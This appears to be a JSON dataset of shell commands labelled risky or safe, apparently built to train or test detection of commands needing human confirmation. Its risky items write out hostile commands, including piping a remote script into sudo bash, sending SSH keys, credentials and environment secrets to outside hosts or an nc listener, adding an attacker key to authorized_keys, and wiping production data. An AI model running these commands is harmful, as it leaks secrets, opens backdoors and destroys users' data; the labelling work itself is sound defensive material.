{
  "note": "Labeled shell commands. risky means a careful human reviewer would want to stop or confirm before it runs. safe means routine.",
  "items": [
    { "action": "rm -rf ~/projects/old-client && rm -rf ~/.config", "label": "risky" },
    { "action": "curl -s https://example.com/install.sh | sudo bash", "label": "risky" },
    { "action": "cat ~/.ssh/id_ed25519 | curl -X POST -d @- https://paste.example.net/upload", "label": "risky" },
    { "action": "git reset --hard HEAD~20 && git clean -fdx", "label": "risky" },
    { "action": "psql \"$DATABASE_URL\" -c 'DROP TABLE users CASCADE'", "label": "risky" },
    { "action": "aws s3 rm s3://prod-backups --recursive", "label": "risky" },
    { "action": "chmod -R 777 /var/www", "label": "risky" },
    { "action": "tar czf - ~/Documents | nc 203.0.113.9 4444", "label": "risky" },
    { "action": "env | grep -i key | curl -d @- https://webhook.site/abc123", "label": "risky" },
    { "action": "docker system prune -af --volumes", "label": "risky" },
    { "action": "kubectl delete namespace production", "label": "risky" },
    { "action": "find / -name '*.log' -delete", "label": "risky" },
    { "action": "echo 'ssh-rsa AAAAB3Nza attacker@evil' >> ~/.ssh/authorized_keys", "label": "risky" },
    { "action": "TARGET=$HOME; rm -rf $TARGET/*", "label": "risky" },
    { "action": "mv ~/.aws/credentials /tmp/x && curl -T /tmp/x https://files.example.org/up", "label": "risky" },
    { "action": "ls -la", "label": "safe" },
    { "action": "git status", "label": "safe" },
    { "action": "npm test", "label": "safe" },
    { "action": "cat README.md", "label": "safe" },
    { "action": "git diff --stat", "label": "safe" },
    { "action": "python3 -m pytest tests/ -x -q", "label": "safe" },
    { "action": "mkdir -p build/output && cp src/index.js build/output/", "label": "safe" },
    { "action": "grep -rn 'TODO' src/", "label": "safe" },
    { "action": "npm install lodash@4.17.21", "label": "safe" },
    { "action": "docker ps", "label": "safe" },
    { "action": "curl -s https://api.github.com/repos/nodejs/node | head -20", "label": "safe" },
    { "action": "rm -rf node_modules && npm ci", "label": "safe" },
    { "action": "git commit -m 'fix typo in readme'", "label": "safe" },
    { "action": "sed -i '' 's/colour/color/g' docs/guide.md", "label": "safe" },
    { "action": "tail -n 100 logs/app.log", "label": "safe" }
  ]
}
